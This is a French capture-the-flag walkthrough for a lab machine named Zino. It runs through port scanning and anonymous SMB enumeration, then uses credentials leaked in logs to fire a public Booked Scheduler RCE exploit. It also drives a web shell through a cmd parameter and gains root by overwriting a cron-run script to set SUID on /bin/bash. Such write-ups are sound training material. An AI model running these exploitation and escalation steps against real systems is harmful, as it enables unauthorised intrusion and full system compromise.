  # Zino

	sudo masscan -p1-65535,U:1-65535 192.168.203.64 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.203.64 -oN nmap.txt
	feroxbuster --silent -u http://192.168.203.64:8003
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp vsftpd 3.0.3  
	22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
	139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
	445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
	3306/tcp open mysql?  
	8003/tcp open http Apache httpd 2.4.38
	

http://192.168.203.64:8003/booked/Web/ => Possibilité de s'inscrire et de tenter de réinitialiser un mot de passe perdu

Le SMB est ouvert et j'ai obtenu pas mal d'informations et quelques fichiers : 

	enum4linux -a 192.168.203.64
	smbclient -L //192.168.203.64/ -N
	smbclient //192.168.203.64/Zino -N
	smb: \> mget *
	smb: \> exit
	cat *.log

Je vois deux morceaux intéressants dans ces logs : 

> Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
> </br>...
> </br>Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
> </br>Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"


Je me connecte sur le panel du port 8083 et je vois un "Booked Scheduler v2.7.5" qui me confirme que je vais pouvoir utiliser un exploit trouvé un peu plus tôt. 
</br>Voir : https://www.exploit-db.com/exploits/50594

	python2.7 ~/000_exploits/exploit_Booked_RCE.py http://192.168.203.64:8003 admin adminadmin
	...
	$ "ls"
	$ "cat /home/peter/local.txt"

Attention aux guillemets sous peine de faire planter le script. Pour plus de confort on peut aussi déclencher la backdoor manuellement et proprement en allant sur http://192.168.203.64:8003/booked/Web/custom-favicon.php?cmd=ls par exemple.

	
### Élévation de privilèges : 

Simple tâche planifiée avec un script à remplacer :

	cat /etc/crontab
	echo "import os" > /var/www/html/booked/cleanup.py
	echo "os.system('chmod 4777 /bin/bash')" >> /var/www/html/booked/cleanup.py
	...
	/bin/bash -p 
	whoami
	cat /root/root.txt



